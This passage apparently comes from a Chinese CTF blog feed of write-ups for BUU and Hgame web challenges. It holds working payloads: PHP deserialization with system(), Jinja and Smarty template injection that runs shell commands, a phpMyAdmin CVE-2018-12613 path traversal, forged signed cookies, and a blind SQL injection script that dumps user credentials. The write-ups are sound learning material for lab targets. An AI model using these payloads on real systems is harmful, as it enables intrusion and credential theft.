keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"date"</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></span></code></pre></code></pre><p>可以看到禁了很多函数<br>有个class<br>可以用反序列<code>unserialize</code>函数      </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><pre><code>```php&lt;?phpclass Test &#123;    //var $p = &quot;find / -name &#39;flag*&#39;&quot;;    //var $p = &quot;ls /&quot;;    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();$b=serialize($a);echo $b;       ```    </code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>序列化</li><li><code>call_user_func</code>       <blockquote><p><code>call_user_func</code> — 把第一个参数作为回调函数调用<br><code> call_user_func ( callable $callback , mixed $parameter = ? , mixed $... = ? ) : mixed</code><br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 </p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题038</title>
    <link href="/2021/02/26/BUU038/"/>
    <url>/2021/02/26/BUU038/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[De1CTF 2019]SSRF Me<br>hint：<code>flag is in ./flag.txt</code>         </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment">#encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment">##函数--各个定义</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#SandBox For Remote_Addr</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment">##函数</span>        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>      <span class="token comment">##扫描目录</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token comment">##读取</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">##检查</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment">#generate Sign For Action Scan.</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                 <span class="token comment">##路由1---->对传参加密</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>              <span class="token comment">##路由2------>执行</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token comment">##路由3---->首页</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">##加密函数</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>         </code></pre></code></pre><p>利用点：     </p><pre><code>result[&#39;data&#39;] = f.read()        </code></pre><p>前提是action里有read和scan,还要通过检查<br>可以通过路由1获得加密后的sign<br><code>geneSign()</code>里<code>action=&quot;scan&quot;</code>所以我们要在param里加上read<br>获得sign后<br>在路由2里修改cookie传参即可        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：</p><pre><code>/geneSign?param=flag.txtread       </code></pre><p>得到sign:<code>411d8c10d1b90c5c4e39c1904652f8c0</code>       </p><pre><code>/De1ta?param=flag.txt      cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>flask代码审计<br>虽然看了看flask的基本知识，但看到一大段代码时总抓不到重点，还要多看看     </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题037</title>
    <link href="/2021/02/25/BUU037/"/>
    <url>/2021/02/25/BUU037/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[GWCTF 2019]我有一个数据库<img src="https://ftp.bmp.ovh/imgs/2021/02/8714abd7c1fa4046.png">         </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>目录扫描到<code>phpmyadmin</code>(为什么我的就扫不到？御剑，dirsearch,dirb都扫不到？？？？？)<br>然后是phpmyadmin4.81的一个远程文件读取漏洞      </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code><br>得到flag   </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://blog.csdn.net/weixin_43872099/article/details/104128639">CVE-2018-12613</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgameweek3</title>
    <link href="/2021/02/24/hgameweek3/"/>
    <url>/2021/02/24/hgameweek3/</url>
    
    <content type="html"><![CDATA[<h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>题目描述：<code>........r4u用git部署到了自己的服务器上......</code><br>提示<code>.git</code>泄露<br>githack一下得到源码     </p><pre><code>//index.php&lt;?phperror_reporting(0);require_once (&quot;simulator.php&quot;);$simulator = new Simulator();$cards = array();if(isset($_POST[&quot;draw&quot;]))&#123;    $cards = $simulator-&gt;draw($_POST[&quot;draw&quot;]);&#125;?&gt;//simulator.php&lt;?phpclass Simulator&#123;    public $session;    public $cardsPool;    public function __construct()&#123;        $this-&gt;session = new Session();        if(array_key_exists(&quot;session&quot;, $_COOKIE))&#123;            $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]);     #验证cookie        &#125;        $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;);        $this-&gt;cardsPool-&gt;init();    &#125;    public function draw($count)&#123;        $result = array();        for($i=0; $i&lt;$count; $i++)&#123;            $card = $this-&gt;cardsPool-&gt;draw();            if($card[&quot;stars&quot;] == 6)&#123;                $this-&gt;session-&gt;set(&#39;&#39;, $card[&quot;No&quot;]);            &#125;            $result[] = $card;        &#125;        $this-&gt;session-&gt;save();        return $result;    &#125;    public function getLegendary()&#123;        $six = array();        $data = $this-&gt;session-&gt;getAll();        foreach ($data as $item) &#123;            $six[] = $this-&gt;cardsPool-&gt;cards[6][$item];        &#125;        return $six;    &#125;&#125;class CardsPool&#123;    public $cards;    private $file;    public function __construct($filePath)    &#123;        if (file_exists($filePath)) &#123;            $this-&gt;file = $filePath;        &#125; else &#123;            die(&quot;Cards pool file doesn&#39;t exist!&quot;);        &#125;    &#125;    public function draw()    &#123;        $rand = mt_rand(1, 100);        $level = 0;        if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) &#123;            $level = 3;        &#125; elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) &#123;            $level = 4;        &#125; elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) &#123;            $level = 5;        &#125; elseif ($rand == 100) &#123;            $level = 6;        &#125;        $rand_key = array_rand($this-&gt;cards[$level]);        return array(            &quot;stars&quot; =&gt; $level,            &quot;No&quot; =&gt; $rand_key,            &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key]        );    &#125;    public function init()    &#123;        $this-&gt;cards = include($this-&gt;file);    &#125;    public function __toString()&#123;        return file_get_contents($this-&gt;file);    &#125;&#125;class Session&#123;    private $sessionData;    const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;    public function __construct()&#123;&#125;    public function set($key, $value)&#123;        if(empty($key))&#123;            $this-&gt;sessionData[] = $value;        &#125;else&#123;            $this-&gt;sessionData[$key] = $value;        &#125;    &#125;    public function getAll()&#123;        return $this-&gt;sessionData;    &#125;    public function save()&#123;               #生成cookie        $serialized = serialize($this-&gt;sessionData);        $sign = base64_encode(md5($serialized . self::SECRET_KEY));        $value = base64_encode($serialized) . &quot;.&quot; . $sign;        setcookie(&quot;session&quot;,$value);       &#125;    public function extract($session)&#123;     #验证        $sess_array = explode(&quot;.&quot;, $session);        $data = base64_decode($sess_array[0]);        $sign = base64_decode($sess_array[1]);        if($sign === md5($data . self::SECRET_KEY))&#123;            $this-&gt;sessionData = unserialize($data);        &#125;else&#123;            unset($this-&gt;sessionData);            die(&quot;Go away! You hacker!&quot;);        &#125;    &#125;&#125;class Eeeeeeevallllllll&#123;    public $msg=&quot;坏坏liki到此一游&quot;;    public function __destruct()    &#123;        echo $this-&gt;msg;    &#125;&#125;     </code></pre><p>通看一遍的话，主要看到几个魔法函数<br>其中：     </p><pre><code>public function __toString()&#123;        return file_get_contents($this-&gt;file);    &#125;        </code></pre><p><code>file_get_content</code>可以让我们读取文件<br>最后的echo可以触发<code>__toString</code><br>然后是那个<code>unserialize</code><br>想要反序列化，必须满足cookie<br>所以需要看cookie的生成来自己构造cookie     </p><pre><code>&lt;?phpclass Eeeeeeevallllllll&#123;    public $msg;&#125;class CardsPool&#123;    public $file=&quot;./flag.php&quot;;&#125;$a=new Eeeeeeevallllllll();$a-&gt;msg=new CardsPool();$b=serialize($a);echo $b.&quot;\n&quot;;$SECRET_KEY=&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;$sign = base64_encode(md5($b . $SECRET_KEY));$value = base64_encode($b) . &quot;.&quot; . $sign;echo $value;?&gt;   </code></pre><p>这个出来的和wp相比差了一些，但可以得到flag             </p><p>反序列化后<code>$this-&gt;sessionData = unserialize($data);</code><br>最后触发<code>__toString</code><br>返回flag<br>..<br>..<br>..<br>…<br>还是有点懵……….先就这吧        </p><h2 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h2><p>题目描述：<code>.........Python 写了一个 TodoList.....</code><br>模板注入<br>注册后发一个已完成的<code>&#123;&#123;7*7&#125;&#125;</code>查看后是49        </p><p>过滤     </p><p>包含 <code>hgame</code> 和 <code>emagh</code> 的字符串都会被替换为 <code>Stop!!!</code><br>可以以<code>base64</code>输出<br>payload:<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag | base64').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p><h2 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/f2a261a9c5cd3ea3.png"><br>一个登录界面<br>正常输入，回显是<code>WARNING! LOGIN FIALED! System is being maintained.</code>一个弹窗<br>带符号的话，回显是<code> Invalid username</code>弹窗<br>wp中<br>SQL语句是：<code>SELECT * FROM `u5ers` WHERE `usern@me`=&#39;$username&#39; and `p@ssword`=&#39;$password&#39;</code><br>然后可以用<code>\</code>转义第二个<code>&#39;</code><br><code>username=admin\</code><br><code>password=or 1=1#</code><br>原语句就变为:<code> WHERE `usern@me`=&#39;admin\&#39;or 1=1#&#39;</code><br>时间盲注：      </p><p>枚举法：       </p><pre><code>import requestsimport timeimport datetimeurl=&quot;https://jailbreak.liki.link/login.php&quot;flag=&quot;&quot;for i in range(1,100):    for j in range(31,128):        #payload=&quot;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        #payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        #payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(`usern@me`,0x2c,`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        data=&#123;&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:payload&#125;        time1 = datetime.datetime.now()        res=requests.post(url=url,data=data)        time2 = datetime.datetime.now()        tem=(time2-time1).seconds        if tem&gt;2:            flag=flag+chr(j)            print(flag)            break        else:            j=j+1        </code></pre><p>然后是用python fuzz过滤的符号—学到了     </p><pre><code>import requestsurl=&#39;https://jailbreak.liki.link/login.php&#39;str=&#39;WARNING! LOGIN FIALED!&#39;for i in range(30,128):    st=chr(i)    data=&#123;&#39;username&#39;:st,&#39;password&#39;:st&#125;    r=requests.post(url=url,data=data)    if str not in r.text:        print(st)</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题036</title>
    <link href="/2021/02/24/BUU036/"/>
    <url>/2021/02/24/BUU036/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF2020]The mystery of ip<img src="https://ftp.bmp.ovh/imgs/2021/02/feab62e0498a143e.png">     </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>flag页面抓包<br>提示的IP<br>加个<code>X-Forwarded-For</code><br>先试了试<code>127.0.0.1</code>——–&gt;返回<code>127.0.0.1</code><br>又试了试<code>127</code>———&gt;返回<code>127</code><br>模板注入？？？<br><code>&#123;&#123;7*7&#125;&#125;</code>———-&gt;<code>49</code><br>是模板注入了<br>但不是python了，是PHP的smarty模板<br>{if}{/if}标签       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code>       </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>{if}标签        <blockquote><p>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性。每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;</code> 和 <code>&#123;elseif&#125;</code>，全部的PHP条件表达式和函数都可以在if内使用，如<code>||*, or, &amp;&amp;,</code> and, <code>is_array()</code>, 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题035</title>
    <link href="/2021/02/23/BUU035/"/>
    <url>/2021/02/23/BUU035/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF2020]Mark loves cat<br><img src="https://ftp.bmp.ovh/imgs/2021/02/7c08fb9e1218a7c9.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个看上去很正常的网页，没发现什么点—–扫目录吧<br>看到<code>.git</code>泄露<br>githack<br>下来的只有一个<code>assets</code>文件夹，看别人的WP是有<code>index.php</code>的？？？？？？？       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token 